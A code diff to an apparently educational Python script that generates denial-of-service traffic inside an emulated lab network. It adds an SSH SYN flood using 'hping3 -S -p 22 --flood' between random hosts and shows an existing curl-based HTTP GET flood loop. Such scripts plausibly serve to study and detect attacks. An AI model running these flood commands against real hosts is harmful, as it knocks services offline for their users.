@@ -1,5 +1,5 @@
 #this file will be used to generate attacks in the network  this file contains attacks for educationnal purpose ONLY
-
+#these attacks are dos type (flood attacks) i used the hping3 command 
 import random
 import time 
 def icmp_flood(net):
@@ -40,6 +40,25 @@ def HTTP_GETFLOOD(net):
     
     src.cmd('for i in {1..8000}; do curl -s http://10.0.0.2:8080 > /dev/null; done &')  
     # this command is used to run a get method 80000 times ignoring the return text
+    
+    
+    
+def ssh_flood(net):
+    src_list= ['h1','h2','h3','h4','h5','h6','h7','h8','h9']
+    src_name=random.choice(src_list)
+    src = net.get(src_name)
+    dst_name=None
+    while dst_name not in ['h1','h2','h3','h4','h5','h6','h7','h8','h9'] or dst_name == src_name:   
+            dst_name = random.choice(src_list)
+            dst = net.get(dst_name)
+    
+    src.cmd(f'hping3 -S -p 22 --flood {dst.IP()} &') #attacking the 22 port in tcp 
+    
+    
+    
+            
+    
+
     
     
     
